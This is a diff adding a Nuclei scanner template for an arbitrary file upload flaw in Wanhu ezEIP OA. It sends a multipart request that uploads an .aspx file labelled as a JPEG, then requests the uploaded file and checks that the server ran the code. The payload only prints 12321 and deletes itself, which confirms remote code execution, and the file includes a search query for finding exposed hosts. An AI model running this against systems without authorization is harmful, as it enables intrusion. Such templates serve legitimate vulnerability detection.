@@ -1,0 +1,48 @@
+id: wanhu-ezeip-ajaxupload-fileupload
+
+info:
+  name: 万户ezeip ajaxupload.aspx任意文件上传，高版本访问shell会出现403
+  author: pphua,nobody
+  severity: critical
+  reference:
+    - none
+  tags: wanhu,oa,ezeip,fileupload
+  metadata:
+    veified: true
+    hunter-query: app.name="万户 ezEip"
+
+variables:
+  filename: "{{to_lower(rand_base(10))}}"
+  boundary: "{{to_lower(rand_base(20))}}"
+
+http:
+  - raw:
+      - |
+        POST /whir_system/Res/assets/js/fileinput/js/AjaxUpload.ashx HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Moziilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1866.237 Safari/537.36
+        Content-Type: multipart/form-data; boundary=----{{boundary}}
+
+        ------{{boundary}}
+        Content-Disposition: form-data; name="txt_file"; filename="{{filename}}.aspx"
+        Content-Type: image/jpeg
+
+        <%@ Page Language="C#"%><% Response.Write(111*111);System.IO.File.Delete(Server.MapPath(Request.Url.AbsolutePath)); %>
+        ------{{boundary}}
+      - |
+        GET /uploadfiles/{{url}} HTTP/1.1
+        Host: {{Hostname}}
+
+    extractors:
+      - type: json
+        name: url
+        part: body
+        internal: true
+        group: 1
+        json:
+          - .Msg
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code_2==200 && contains_all(body_2,'12321')
